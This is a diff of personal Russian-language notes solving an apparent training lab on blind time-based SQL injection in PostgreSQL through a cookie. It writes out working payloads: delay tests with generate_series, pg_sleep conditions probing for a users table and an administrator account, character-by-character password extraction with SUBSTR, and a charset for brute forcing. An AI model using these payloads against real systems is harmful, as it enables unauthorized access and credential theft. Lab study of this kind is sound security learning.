@@ -26,11 +26,13 @@ To solve the lab, log in as the `administrator` user.
 ==действие:==
 1) проверяю все места на time based
 в куки параметр подставил 
+```sql
 '||(SELECT COUNT(*) FROM generate_series(1,10000000))--
 и
 '||(SELECT COUNT(*) FROM generate_series(1,30000000))--
 и
 '||(SELECT COUNT(*) FROM generate_series(1,100))--
+```
 
 работает конкатенация через `||`
 
@@ -39,32 +41,43 @@ To solve the lab, log in as the `administrator` user.
 
 2)   есть ли таблица юзер ?
 буду использовать case
-
+```sql
 ' || (SELECT CASE WHEN EXISTS (SELECT 1 FROM information_schema.tables WHERE table_name='users') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
+```
 сработало - значит таблица есть такая!
 
 3) есть ли в ней колонка `username` and `password` ?
 
 
+```sql
 '|| (select case when exists(select 1 from users where username='administrator') then pg_sleep(5) else pg_sleep(0) end)--
+```
 
 сработало! значит есть такая учетная запись!
 
 4) узнать пароль побуквенно!
 
-'|| (select case when exists(select 1 from users where password='a' where username='administrator') then pg_sleep(5) else pg_sleep(0) end)--   
+```sql
+'|| (select case when exists(select 1 from users where password='a' where username='administrator') then pg_sleep(5) else pg_sleep(0) end)-- 
+```  
 ОШИБКА! ==два where нельзя нужно заменить второе where на AND==
 
+```sql
 ' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE password='a' AND username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+```
 ==ЭТО ПРОСТО ПРОВЕРКА ЧТО ПАРОЛЬ = "a"
 
 SUBSTR(password,1,1)     вернет нужную букву / 
 в некот бд ==SUBSTR== тоже что ==SUBSTRING== 
 
 
+```sql
 ' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE SUBSTR(password,1,1)='a' AND username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+```
 
 пароль: mssys394vg2g7c4dfrtv
+
+------
 
 ВЫПОЛНЕНО!!
 
@@ -73,6 +86,7 @@ SUBSTR(password,1,1)     вернет нужную букву /
 итого: нужно потренироваться в sql запросах но по смыслу все предельно ясно!
 ниже пейлоад: латин алфавит нижнестроч + цифры
 
+```c
 - `%20` или `+` = пробел
     
 - `%27` = `'` (апостроф)
@@ -124,3 +138,4 @@ z
 8
 9
 0
+```
